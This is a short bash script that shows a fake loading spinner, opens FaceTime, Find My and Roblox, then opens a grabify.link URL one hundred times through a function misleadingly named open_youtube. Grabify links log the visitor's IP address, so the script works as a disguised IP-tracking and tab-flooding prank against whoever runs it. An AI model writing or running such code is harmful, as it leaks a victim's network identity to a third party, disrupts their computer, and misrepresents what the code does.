

function show_loading() {
    local counter=0
    local spinner="/-\\|"
    while true; do
        printf "\r%s | Loading... %s | %s" "$counter" "$spinner" "$counter"
        spinner=${spinner#?}${spinner%???}
        counter=$((counter + 1))
        if [ $counter -eq 100 ]; then
            break
        fi
        sleep 0.1
    done
}


function show_lines() {
    printf "%s\n" "###########################################################"
    show_loading &
    local pid=$!
    printf "%s\n" "###########################################################"
    wait $pid
}

show_lines

open facetime://
open findmy://
open -a /Applications/Roblox.app



open_youtube() {
  if command -v open &> /dev/null; then
    open "$1" &> /dev/null
  elif command -v xdg-open &> /dev/null; then
    xdg-open "$1" &> /dev/null
  else
    echo "Error: Unable to open the URL. Please ensure you have 'open' or 'xdg-open' command available." &> /dev/null
  fi
}


for ((i=1; i<=100; i++)); do
  open_youtube "https://grabify.link/4O62IO"
done
